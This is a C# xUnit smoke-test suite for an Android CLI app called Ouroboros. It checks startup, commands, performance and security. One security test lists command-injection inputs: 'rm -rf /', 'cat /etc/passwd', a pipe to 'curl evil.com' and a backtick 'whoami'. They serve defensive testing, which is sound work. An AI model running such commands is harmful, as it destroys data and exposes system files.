using FluentAssertions;
using Xunit;

namespace Ouroboros.Android.Tests;

/// <summary>
/// Smoke tests for CI/CD pipeline - fast, essential checks before distribution
/// These tests verify that critical functionality works before the APK is distributed to testers
/// </summary>
[Trait("Category", "SmokeTests")]
public class SmokeTests
{
    /// <summary>
    /// Critical: Verify app initialization doesn't throw unhandled exceptions
    /// This was the root cause of the purple screen bug
    /// </summary>
    [Fact]
    public void Smoke_AppInitialization_ShouldNotThrowUnhandledException()
    {
        // Arrange & Act
        Exception? caughtException = null;
        
        try
        {
            // Simulate MainPage initialization
            var mainPage = new MainPage();
        }
        catch (Exception ex)
        {
            caughtException = ex;
        }

        // Assert
        caughtException.Should().BeNull(
            "MainPage initialization must not throw unhandled exceptions. " +
            "If services fail, they should be caught and logged, not crash the app.");
    }

    /// <summary>
    /// Critical: Verify core services can be instantiated
    /// </summary>
    [Fact]
    public void Smoke_CoreServices_CanBeInstantiated()
    {
        // Arrange & Act
        Action cliExecutorCreation = () => new Services.CliExecutor();
        Action ollamaServiceCreation = () => new Services.OllamaService();
        
        // Assert
        cliExecutorCreation.Should().NotThrow("CliExecutor must be instantiable");
        ollamaServiceCreation.Should().NotThrow("OllamaService must be instantiable");
    }

    /// <summary>
    /// Critical: Verify help command works (most basic functionality)
    /// </summary>
    [Fact]
    public async Task Smoke_HelpCommand_ShouldExecuteSuccessfully()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();

        // Act
        var result = await cliExecutor.ExecuteCommandAsync("help");

        // Assert
        result.Should().NotBeNullOrWhiteSpace("Help command must return content");
        result.Should().Contain("help", "Help text should mention 'help' command");
        result.Should().Contain("Available commands", "Help should list available commands");
    }

    /// <summary>
    /// Critical: Verify version command works
    /// </summary>
    [Fact]
    public async Task Smoke_VersionCommand_ShouldReturnVersionInfo()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();

        // Act
        var result = await cliExecutor.ExecuteCommandAsync("version");

        // Assert
        result.Should().NotBeNullOrWhiteSpace("Version command must return content");
        result.Should().Contain("Ouroboros", "Version should mention app name");
        result.Should().MatchRegex(@"\d+\.\d+", "Version should contain version number");
    }

    /// <summary>
    /// Important: Verify invalid commands are handled gracefully
    /// </summary>
    [Fact]
    public async Task Smoke_InvalidCommand_ShouldReturnErrorNotCrash()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();
        var invalidCommand = "thisisnotavalidcommand12345";

        // Act
        var result = await cliExecutor.ExecuteCommandAsync(invalidCommand);

        // Assert
        result.Should().NotBeNullOrWhiteSpace("Invalid commands should return error message");
        result.Should().Contain("Unknown", "Error message should indicate command is unknown");
    }

    /// <summary>
    /// Important: Verify empty command is handled
    /// </summary>
    [Fact]
    public async Task Smoke_EmptyCommand_ShouldNotCrash()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();

        // Act
        Func<Task> act = async () => await cliExecutor.ExecuteCommandAsync("");

        // Assert
        await act.Should().NotThrowAsync("Empty commands should be handled gracefully");
    }

    /// <summary>
    /// Important: Verify status command works (connection check)
    /// </summary>
    [Fact]
    public async Task Smoke_StatusCommand_ShouldExecute()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();

        // Act
        var result = await cliExecutor.ExecuteCommandAsync("status");

        // Assert
        result.Should().NotBeNullOrWhiteSpace("Status command must return content");
        result.Should().MatchRegex("Status|status|Connection|connection", 
            "Status should show connection or status information");
    }

    /// <summary>
    /// Performance: Verify app initialization is reasonably fast
    /// </summary>
    [Fact]
    public void Smoke_AppInitialization_ShouldBeFast()
    {
        // Arrange
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();

        // Act
        var mainPage = new MainPage();
        stopwatch.Stop();

        // Assert
        stopwatch.ElapsedMilliseconds.Should().BeLessThan(2000, 
            "App initialization should take less than 2 seconds");
    }

    /// <summary>
    /// Performance: Verify command execution is responsive
    /// </summary>
    [Fact]
    public async Task Smoke_CommandExecution_ShouldBeResponsive()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();

        // Act
        await cliExecutor.ExecuteCommandAsync("help");
        stopwatch.Stop();

        // Assert
        stopwatch.ElapsedMilliseconds.Should().BeLessThan(1000, 
            "Basic commands should execute in under 1 second");
    }

    /// <summary>
    /// Regression: Purple screen bug - initialization errors must not prevent UI render
    /// </summary>
    [Fact]
    public void Smoke_InitializationError_ShouldNotPreventUIRender()
    {
        // This test documents the purple screen bug fix
        // If services fail during initialization, the UI must still render with error messages
        
        // Arrange - Simulate service failure scenario
        bool uiRendered = true;
        Exception? unhandledException = null;

        // Act
        try
        {
            // In the actual app, MainPage constructor has try-catch blocks
            // that catch service initialization errors and show them in UI
            var mainPage = new MainPage();
            
            // If we get here without exception, UI can render
            uiRendered = mainPage != null;
        }
        catch (Exception ex)
        {
            unhandledException = ex;
            uiRendered = false;
        }

        // Assert
        uiRendered.Should().BeTrue("UI must render even if services fail to initialize");
        unhandledException.Should().BeNull("No unhandled exceptions during initialization");
    }
}

/// <summary>
/// Critical integration smoke tests
/// These test the interaction between components
/// </summary>
[Trait("Category", "SmokeTests")]
[Trait("Category", "Integration")]
public class IntegrationSmokeTests
{
    /// <summary>
    /// Verify CliExecutor and OllamaService integration
    /// </summary>
    [Fact]
    public async Task Smoke_Integration_ConfigCommand_ShouldConfigureEndpoint()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();
        var testEndpoint = "http://localhost:11434";

        // Act
        var result = await cliExecutor.ExecuteCommandAsync($"config {testEndpoint}");

        // Assert
        result.Should().NotBeNullOrWhiteSpace();
        result.Should().MatchRegex("configured|Configured", "Config command should confirm configuration");
    }

    /// <summary>
    /// Verify command history service integration
    /// </summary>
    [Fact]
    public async Task Smoke_Integration_CommandHistory_ShouldTrackCommands()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();

        // Act
        await cliExecutor.ExecuteCommandAsync("help");
        await cliExecutor.ExecuteCommandAsync("version");
        var historyResult = await cliExecutor.ExecuteCommandAsync("history");

        // Assert
        historyResult.Should().NotBeNullOrWhiteSpace();
        // History command should work or gracefully indicate it's not available
        historyResult.Should().Satisfy(
            r => r.Contains("help") || r.Contains("history") || r.Contains("History"),
            "History command should either show history or acknowledge the command");
    }

    /// <summary>
    /// Verify error handling throughout the pipeline
    /// </summary>
    [Fact]
    public async Task Smoke_Integration_ErrorHandling_ShouldBeRobust()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();
        var invalidCommands = new[] { "invalid", "", "   ", "!!!@@###" };

        // Act & Assert
        foreach (var cmd in invalidCommands)
        {
            Func<Task> act = async () => await cliExecutor.ExecuteCommandAsync(cmd);
            
            await act.Should().NotThrowAsync(
                $"Command '{cmd}' should be handled gracefully without throwing");
        }
    }
}

/// <summary>
/// Security smoke tests - verify no obvious security issues
/// </summary>
[Trait("Category", "SmokeTests")]
[Trait("Category", "Security")]
public class SecuritySmokeTests
{
    /// <summary>
    /// Verify command injection is not possible
    /// </summary>
    [Fact]
    public async Task Smoke_Security_CommandInjection_ShouldBeSafe()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();
        var maliciousCommands = new[]
        {
            "help; rm -rf /",
            "version && cat /etc/passwd",
            "status | curl evil.com",
            "help `whoami`"
        };

        // Act & Assert
        foreach (var cmd in maliciousCommands)
        {
            var result = await cliExecutor.ExecuteCommandAsync(cmd);
            
            // Should either treat as invalid command or safely execute only the valid part
            result.Should().NotBeNull("Malicious commands should be handled safely");
            
            // Verify no actual injection occurred (would throw or cause issues)
            Func<Task> act = async () => await cliExecutor.ExecuteCommandAsync(cmd);
            await act.Should().NotThrowAsync("Injection attempts should not crash the app");
        }
    }

    /// <summary>
    /// Verify sensitive data is not logged in error messages
    /// </summary>
    [Fact]
    public async Task Smoke_Security_ErrorMessages_ShouldNotLeakSensitiveData()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();
        var commandWithFakeCredentials = "config http://admin:password123@localhost:11434";

        // Act
        var result = await cliExecutor.ExecuteCommandAsync(commandWithFakeCredentials);

        // Assert
        result.Should().NotBeNullOrWhiteSpace();
        // Error messages should not expose credentials
        // This is a best-effort check - manual review still needed
        result.Should().NotContainAny(new[] { "password123", "admin:password" }, 
            "Error messages should not expose credentials");
    }
}

/// <summary>
/// Compatibility smoke tests
/// </summary>
[Trait("Category", "SmokeTests")]
[Trait("Category", "Compatibility")]
public class CompatibilitySmokeTests
{
    /// <summary>
    /// Verify core functionality works without network
    /// </summary>
    [Fact]
    public async Task Smoke_Compatibility_OfflineMode_BasicCommandsShouldWork()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();

        // Act - Commands that don't require network
        var helpResult = await cliExecutor.ExecuteCommandAsync("help");
        var versionResult = await cliExecutor.ExecuteCommandAsync("version");

        // Assert
        helpResult.Should().NotBeNullOrWhiteSpace("Help should work offline");
        versionResult.Should().NotBeNullOrWhiteSpace("Version should work offline");
    }

    /// <summary>
    /// Verify app handles concurrent command execution
    /// </summary>
    [Fact]
    public async Task Smoke_Compatibility_ConcurrentCommands_ShouldBeHandled()
    {
        // Arrange
        var cliExecutor = new Services.CliExecutor();
        var tasks = new List<Task<string>>();

        // Act - Execute multiple commands concurrently
        for (int i = 0; i < 5; i++)
        {
            tasks.Add(cliExecutor.ExecuteCommandAsync("help"));
        }

        var results = await Task.WhenAll(tasks);

        // Assert
        results.Should().HaveCount(5);
        results.Should().OnlyContain(r => !string.IsNullOrWhiteSpace(r), 
            "All concurrent commands should complete successfully");
    }
}
